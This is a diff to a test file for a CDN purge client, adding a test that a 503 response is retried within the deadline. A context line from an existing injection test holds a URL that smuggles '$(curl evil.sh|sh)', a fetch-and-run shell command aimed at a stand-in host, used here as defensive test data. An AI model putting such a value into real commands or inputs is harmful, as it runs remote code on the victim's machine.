@@ -297,3 +297,21 @@ describe('a purge endpoint a shell would read', () => {
     expect(failure?.cause).toContain('https://cdn.test/$(curl evil.sh|sh)/purge');
   });
 });
+
+describe('purgePost · through outbound()', () => {
+  test('a 503 is retried inside the deadline, so a CDN blip does not fail the purge', async () => {
+    let calls = 0;
+    const response = await purgePost({
+      driver: 'cloudflare',
+      url: 'https://cdn.test/purge',
+      headers: {},
+      body: {},
+      timeoutMs: 5_000,
+      fetch: async () => {
+        calls += 1;
+        return calls === 1 ? new Response('', { status: 503 }) : new Response('{}');
+      },
+    });
+    expect([response.status, calls]).toEqual([200, 2]);
+  });
+});
